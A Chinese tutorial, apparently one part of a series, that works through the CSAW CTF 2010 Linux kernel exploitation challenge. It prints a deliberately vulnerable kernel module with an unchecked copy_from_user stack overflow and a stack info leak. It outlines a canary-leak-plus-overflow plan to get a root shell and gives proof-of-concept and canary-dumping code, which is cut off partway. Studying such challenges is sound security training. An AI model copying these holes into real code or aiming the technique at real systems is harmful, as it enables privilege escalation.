# 【系列分享】Linux 内核漏洞利用教程（三）：实践 CSAW CTF 题目
|
##### 译文声明
本文是翻译文章，文章来源：安全客
译文仅供参考，具体内容表达以及含义原文为准。
****
****
****
作者：[o0xmuhe](http://bobao.360.cn/member/contribute?uid=32403999)
预估稿费：400RMB
投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
**  
**
**传送门**
* * *
**[【系列分享】Linux
内核漏洞利用教程（一）：环境配置](http://bobao.360.cn/learning/detail/3700.html)**
[**【系列分享】Linux 内核漏洞利用教程（二）：两个Demo**
****](http://bobao.360.cn/learning/detail/3702.html)
**  
**
**0x00: 前言**
经过前两篇文章的学习，对于linux kernel exploit应该有了一点认识了，那么这次来实践一道古老的CTF题目，来自CSAW CTF
2010的一道kernel
exploit题目。本来整个题目是要求读取flag的(root才能读)，我这里直接提权做的，反正最后都能达到目的。更多的关于linux kernel
exploit相关的资料可以看看这个项目。
**0x01 :漏洞代码**
有漏洞的代码如下：
    /*
     * csaw.c
     * CSAW CTF Challenge Kernel Module
     * Jon Oberheide 
     *
     * This module implements the /proc/csaw interface which can be read
     * and written like a normal file. For example:
     *
     * $ cat /proc/csaw 
     * Welcome to the CSAW CTF challenge. Best of luck!
     * $ echo "Hello World" > /proc/csaw
     */
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define MAX_LENGTH 64
    MODULE_LICENSE("GPL");
    MODULE_AUTHOR("Jon Oberheide");
    MODULE_DESCRIPTION("CSAW CTF Challenge Kernel Module");
    static struct proc_dir_entry *csaw_proc;
    /*
    struct proc_dir_entry {
        unsigned short low_ino;
        unsigned short namelen;
        const char *name;
        mode_t mode;
        nlink_t nlink;
        uid_t uid;
        gid_t gid;
        unsigned long size;
        struct inode_operations * proc_iops;
        struct file_operations * proc_fops;
        get_info_t *get_info;
        struct module *owner;
        struct proc_dir_entry *next, *parent, *subdir;
        void *data;
        read_proc_t *read_proc;
        write_proc_t *write_proc;
        atomic_t count;      //use count 
        int deleted;        //delete flag
        kdev_t    rdev;
    };
    */
    int
    csaw_write(struct file *file, const char __user *ubuf, unsigned long count, void *data)
    {
        char buf[MAX_LENGTH];
        printk(KERN_INFO "csaw: called csaw_writen");
        /* 
         * We should be safe to perform this copy from userspace since our 
         * kernel is compiled with CC_STACKPROTECTOR, which includes a canary
         * on the kernel stack to protect against smashing the stack.
         *
         * While the user could easily DoS the kernel, I don't think they
         * should be able to escalate privileges without discovering the 
         * secret stack canary value.
         */
        if (copy_from_user(&buf, ubuf, count)) {
            printk(KERN_INFO "csaw: error copying data from userspacen");
            return -EFAULT;
        }
        return count;
    }
    int
    csaw_read(char *page, char **start, off_t off, int count, int *eof, void *data)
    {
        char buf[MAX_LENGTH];
        printk(KERN_INFO "csaw: called csaw_readn");
        *eof = 1;
        memset(buf, 0, sizeof(buf));
        strcpy(buf, "Welcome to the CSAW CTF challenge. Best of luck!n");
        memcpy(page, buf + off, MAX_LENGTH);
        return MAX_LENGTH;
    }
    static int __init
    csaw_init(void)
    {
        printk(KERN_INFO "csaw: loading modulen");
        csaw_proc = create_proc_entry("csaw", 0666, NULL);
        csaw_proc->read_proc = csaw_read;
        csaw_proc->write_proc = csaw_write;
        printk(KERN_INFO "csaw: created /proc/csaw entryn");
        return 0;
    }
    static void __exit
    csaw_exit(void)
    {
        if (csaw_proc) {
            remove_proc_entry("csaw", csaw_proc);
        }
        printk(KERN_INFO "csaw: unloading modulen");
    }
    module_init(csaw_init);
    module_exit(csaw_exit);
    Makefile如下
    obj-m := csaw.o  
    KERNELDR := ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1/
    PWD := $(shell pwd)  
    modules:  
            $(MAKE) -C $(KERNELDR) M=$(PWD) modules  
    moduels_install:  
            $(MAKE) -C $(KERNELDR) M=$(PWD) modules_install  
    clean:  
            rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions
**0x02 : 分析**
首先漏洞点很好找，就是一个简单粗暴的栈溢出：
    int
    csaw_write(struct file *file, const char __user *ubuf, unsigned long count, void *data)
    {
        char buf[MAX_LENGTH];
        printk(KERN_INFO "csaw: called csaw_writen");
        /* 
         * We should be safe to perform this copy from userspace since our 
         * kernel is compiled with CC_STACKPROTECTOR, which includes a canary
         * on the kernel stack to protect against smashing the stack.
         *
         * While the user could easily DoS the kernel, I don't think they
         * should be able to escalate privileges without discovering the 
         * secret stack canary value.
         */
        if (copy_from_user(&buf, ubuf, count)) {
            printk(KERN_INFO "csaw: error copying data from userspacen");
            return -EFAULT;
        }
        return count;
    }
这里，从用户空间做拷贝的时候未作任何check，导致过长的字符串可以覆盖到返回地值，这种情形和我们第二篇文章中遇到的情况一样，那么是不是就按照那个文章做利用就可以了呢？并不是，从注释中看出，出题者是开启了kernel
CANARY选项的，也就是说，我们直接去覆盖的话，会先覆盖CANARY，然后就会过不了check从而kernel panic。
是不是这就没法玩了呢？一般来说，对于CANARY这种情况，我们采取的策略要么是leak，要么就是crack。继续分析代码，看到read部分：
    int
    csaw_read(char *page, char **start, off_t off, int count, int *eof, void *data)
    {
        char buf[MAX_LENGTH];
        printk(KERN_INFO "csaw: called csaw_readn");
        *eof = 1;
        memset(buf, 0, sizeof(buf));
        strcpy(buf, "Welcome to the CSAW CTF challenge. Best of luck!n");
        //could leak canary here!!!!
        memcpy(page, buf + off, MAX_LENGTH);
        return MAX_LENGTH;
    }
拼接了栈上一个变量，然后拷贝到了用户空间，而且拷贝的长度很长，这就是出题人故意留下的info leak，好让我们可以leak CANARY的值。
那么现在，我们拥有一个info leak，拥有一个stack bof，两者结合，就是第二篇文章中的利用方式了。只需要组合payload为：
    junk+CANARY+ebp+payload_addr
我们就可以像之前一样去get root shell啦~
**0x03 : Poc**
poc的代码很简单，直接触发漏洞就可以，但是这种直接就kernel panic的。
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    int main(int argc,char *argv[]){
        int fd = open("/proc/csaw",O_RDWR);
        if(!fd){
            printf("errorn");
            exit(1);
        }
        char poc[64];
        memset(poc,0x41,64);
        printf("Triger bug:n");
        write(fd,poc,64);
        return 0;
    }
下面我们写一个dump，可以dump出CANARY的值：
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    int main(int argc,char *argv[]){
        int fd = open("/proc/csaw",O_RDWR);
        if(!fd){
            printf("errorn");
            exit(1);
        }
        lseek(fd,16,SEEK_CUR);
        char buffer[64] = {0};
        read(fd,buffer,64);
        int i,j;
       // memset(buffer,0x41,64);
        for(i = 0;i<4;i++){